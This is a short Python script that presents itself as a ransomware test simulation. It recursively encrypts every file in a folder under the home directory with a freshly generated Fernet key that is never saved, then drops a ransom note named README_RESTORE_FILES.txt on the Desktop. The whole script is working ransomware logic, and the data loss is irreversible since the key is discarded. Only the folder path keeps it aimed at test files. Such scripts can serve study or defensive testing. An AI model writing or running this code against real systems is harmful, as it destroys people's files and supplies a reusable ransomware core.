import os
from pathlib import Path
from cryptography.fernet import Fernet

# Generate a key (for testing, you can save it somewhere)
key = Fernet.generate_key()
cipher = Fernet(key)

# Folder to “encrypt” (test folder, change as needed)
test_folder = Path.home() / "ransomware_test_files"

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        print(f"[+] Encrypted: {file_path}")
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}")

def drop_ransom_note():
    ransom_message = """
Your files have been encrypted (in this test simulation).

This is only a demonstration and no real harm has been done.

If this were real ransomware, instructions to pay or recover files would go here.
"""

    desktop = Path.home() / "Desktop"
    note_path = desktop / "README_RESTORE_FILES.txt"

    try:
        with open(note_path, 'w') as f:
            f.write(ransom_message)
        print(f"[+] Ransom note created at: {note_path}")
    except Exception:
        # fallback if Desktop isn't accessible
        fallback_path = Path.home() / "README_RESTORE_FILES.txt"
        with open(fallback_path, 'w') as f:
            f.write(ransom_message)
        print(f"[+] Ransom note created at: {fallback_path}")

if __name__ == "__main__":
    if not test_folder.exists():
        print(f"Test folder not found: {test_folder}")
        exit()

    for root, _, files in os.walk(test_folder):
        for file in files:
            file_path = Path(root) / file
            encrypt_file(file_path)

    drop_ransom_note()
